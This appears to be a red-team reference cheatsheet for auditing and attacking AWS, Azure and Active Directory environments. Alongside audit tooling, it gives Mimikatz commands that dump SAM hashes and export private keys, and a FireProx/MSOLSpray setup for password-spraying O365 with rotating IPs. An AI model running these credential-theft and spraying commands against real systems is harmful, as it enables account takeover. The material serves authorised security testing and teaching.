## Other Useful Cloud Tools and Techniques Cheatsheet
By Beau Bullock (@dafthack)
### ScoutSuite

Multi-cloud security auditing tool

https://github.com/nccgroup/ScoutSuite

Install ScoutSuite

```bash
sudo apt-get install virtualenv
git clone https://github.com/nccgroup/ScoutSuite
cd ScoutSuite
virtualenv –p python3 venv
source venv/bin/activate
pip install –r requirements.txt
```

To run as root

```bash
sudo apt-get install virtualenv
sudo su
virtualenv -p python3 venv
source venv/bin/activate
pip install scoutsuite
```

Scan AWS environment with ScoutSuite

```bash
python scout.py aws --profile=<aws profile name>

or if installed...

scout aws --profile=<aws profile name>
```

jq queries to help with parsing many ScoutSuite reports

Sometimes you may need to work with multiple ScoutSuite files and report similar items across all of them. The ScoutSuite reports are in json format so the 'jq' tool can be used to parse through them easily. Here are a few short script examples for doing this. Run these from the directory where you output each of the ScoutSuite folders to. 

```bash

### Find All Lambda Environment Variables
for d in */ ; do
	tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.awslambda.regions[].functions[] | select (.env_variables != []) | .arn, .env_variables' >> lambda-all-environment-variables.txt
done

### Find World Listable S3 Buckets
for d in */ ; do
	tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.account_id, .services.s3.findings."s3-bucket-AuthenticatedUsers-read".items[]'  >> s3-buckets-world-listable.txt
done

### Find All EC2 User Data
for d in */ ; do
	tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.ec2.regions[].vpcs[].instances[] | select (.user_data != null) | .arn, .user_data'  >> ec2-instance-all-user-data.txt
done

### Find EC2 Security Groups That Whitelist AWS CIDRs
for d in */ ; do
	tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.account_id' >> ec2-security-group-whitelists-aws-cidrs.txt
	tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.ec2.findings."ec2-security-group-whitelists-aws".items'  >> ec2-security-group-whitelists-aws-cidrs.txt
done

### Find EC2 EBS Public AMIs
for d in */ ; do
	tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.ec2.regions[].images[] | select (.Public == true) | .arn' >> ec2-public-amis.txt
done

### Find All EC2 EBS Volumes Unencrypted
for d in */ ; do
	tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.ec2.regions[].volumes[] | select(.encrypted == false) | .arn' >> ec2-ebs-volume-not-encrypted.txt
done


```

### Cloud_Enum

Tool to search for public resources in AWS, Azure, and GCP

https://github.com/initstring/cloud_enum

```bash
python3 cloud_enum.py -k <name-to-search>
```

### GitLeaks

Search repositories for secrets

https://github.com/zricethezav/gitleaks

Pull GitLeaks with Docker

```bash
sudo docker pull zricethezav/gitleaks
```

Print the help menu

```bash
sudo docker run --rm --name=gitleaks zricethezav/gitleaks --help
```

Use GitLeaks to search for secrets

```bash
sudo docker run --rm --name=gitleaks zricethezav/gitleaks -v -r <repo URL>
```

TruffleHog - https://github.com/dxa4481/truffleHog

Shhgit - https://github.com/eth0izzle/shhgit

Gitrob - https://github.com/michenriksen/gitrob

### Mimikatz

Export Non-Exportable Private Keys From Web Server

```textile
mimikatz# crypto::capi
mimikatz# privilege::debug
mimikatz# crypto::cng
mimikatz# crypto::certificates /systemstore:local_machine /store:my /export
```

Dump passwords hashes from SAM/SYSTEM files

```textile
mimikatz# lsadump::sam /system:SYSTEM /sam:SAM
```

### Check Command History

Linux Bash History Location

```bash
~/.bash_history
```

Windows PowerShell PSReadLine Location

```bash
%USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### PowerView

https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
Find on-prem ADConnect account name and server

```powershell
Get-NetUser -Filter "(samAccountName=MSOL_*)" |Select-Object name,description | fl
```

### FireProx

Password Spraying Azure/O365 while randomizing IPs with FireProx

Install

```bash
git clone https://github.com/ustayready/fireprox
cd fireprox
virtualenv -p python3 .
source bin/activate
pip install -r requirements.txt
python fire.py
```

Launch FireProx

```bash
python fire.py --access_key <access_key_id> --secret_access_key <secret_access_key> --region <region> --url https://login.microsoft.com --command create
```

Password spray using FireProx + MSOLSpray

```powershell
Invoke-MSOLSpray -UserList .\userlist.txt -Password Spring2020 -URL https://api-gateway-endpoint-id.execute-api.us-east-1.amazonaws.com/fireprox
```

### ip2Provider

Check a list of IP addresses against cloud provider IP space

https://github.com/oldrho/ip2provider

### Vulnerable Infrastructure Creation

Cloudgoat - https://github.com/RhinoSecurityLabs/cloudgoat

SadCloud - https://github.com/nccgroup/sadcloud

Flaws Cloud - http://flaws.cloud

Thunder CTF - http://thunder-ctf.cloud 
